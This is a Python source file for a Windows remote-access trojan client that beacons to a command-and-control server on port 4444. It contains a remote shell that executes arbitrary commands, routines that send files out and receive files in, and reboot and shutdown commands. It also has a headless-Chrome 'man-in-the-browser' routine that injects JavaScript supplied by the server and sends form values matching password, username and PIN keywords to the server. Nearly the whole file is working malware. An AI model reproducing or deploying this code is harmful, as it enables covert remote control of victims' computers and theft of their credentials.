# client.py (Windows Client for C2)

import socket
import json
import threading
import subprocess
import os
import time
import base64
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By

SERVER_IP = '10.0.1.37'  # replace with C2 IP
SERVER_PORT = 4444

# Keywords to detect sensitive form fields
KEYWORDS = ['tel', 'phone', 'pin', 'pseudonym', 'username', 'user', 'name', 'uname', 'pass', 'userPass', 'password', 'pwd', 'passwd']

# --- Connection Logic ---
def connect():
    while True:
        try:
            sock = socket.socket()
            sock.connect((SERVER_IP, SERVER_PORT))
            print("Connected to server")
            return sock
        except:
            time.sleep(5)

# --- Command Shell Handler ---
def shell(sock):
    while True:
        try:
            data = sock.recv(4096).decode()
            if data == 'kill':
                break
            elif data.startswith('upload '):
                filepath = data.split(' ', 1)[1]
                if os.path.exists(filepath):
                    with open(filepath, 'rb') as f:
                        sock.send(f.read())
                else:
                    sock.send(b'File not found')
            elif data.startswith('download '):
                filename = data.split(' ', 1)[1]
                with open(filename, 'wb') as f:
                    chunk = sock.recv(8192)
                    f.write(chunk)
                sock.send(b'Download complete')
            elif data == 'reboot':
                subprocess.call('shutdown /r /t 0', shell=True)
            elif data == 'shutdown':
                subprocess.call('shutdown /s /t 0', shell=True)
            else:
                result = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
                sock.send(result)
        except Exception as e:
            sock.send(str(e).encode())

# --- MITB / Injection / Form Grabber ---
def start_mitb(sock):
    chrome_options = Options()
    chrome_options.add_argument('--headless')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--no-sandbox')
    driver = webdriver.Chrome(options=chrome_options)

    while True:
        try:
            for entry in get_config(sock):
                url = entry['url']
                injection = entry['injection']

                driver.get(url)
                driver.execute_script(injection)

                # Notify server that url was visited
                notify = json.dumps({'type': 'visit', 'url': url})
                sock.send(notify.encode())

                # Try to find and submit forms
                forms = driver.find_elements(By.TAG_NAME, 'form')
                for form in forms:
                    inputs = form.find_elements(By.TAG_NAME, 'input')
                    creds = {}
                    for i in inputs:
                        name = i.get_attribute('name')
                        if name and any(k in name.lower() for k in KEYWORDS):
                            creds[name] = i.get_attribute('value')
                    if creds:
                        payload = json.dumps({'type': 'password', 'data': creds})
                        sock.send(payload.encode())
                time.sleep(30)  # wait before scanning again
        except Exception as e:
            print(f"[MITB Error] {e}")
            time.sleep(10)

def get_config(sock):
    try:
        sock.send(b'GET_CONFIG')
        config_raw = sock.recv(8192).decode()
        return json.loads(config_raw)
    except:
        return []

if __name__ == '__main__':
    client_sock = connect()
    threading.Thread(target=shell, args=(client_sock,), daemon=True).start()
    start_mitb(client_sock)
                    
